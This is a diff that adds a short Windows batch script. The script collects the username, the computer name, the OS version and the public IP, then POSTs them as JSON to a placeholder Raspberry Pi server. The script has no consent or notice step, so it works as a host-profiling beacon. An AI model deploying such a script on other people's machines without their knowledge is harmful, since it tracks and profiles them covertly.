@@ -1,0 +1,11 @@
+@echo off
+:: getting data
+set USERNAME=%USERNAME%
+set COMPUTERNAME=%COMPUTERNAME%
+for /f "tokens=2 delims==" %%I in ('wmic os get caption /value ^| find "="') do set OS=%%I
+for /f "tokens=*" %%I in ('powershell -Command "(Invoke-WebRequest -Uri 'https://api64.ipify.org').Content"') do set IP=%%I
+
+:: sending POST-query
+powershell -Command "$body = @{user='%USERNAME%'; computer='%COMPUTERNAME%'; os='%OS%'; ip='%IP%'} | ConvertTo-Json; Invoke-RestMethod -Uri 'http://<IP_RASPBERRY>:5000/log' -Method Post -Body $body -ContentType 'application/json'"
+
+exit
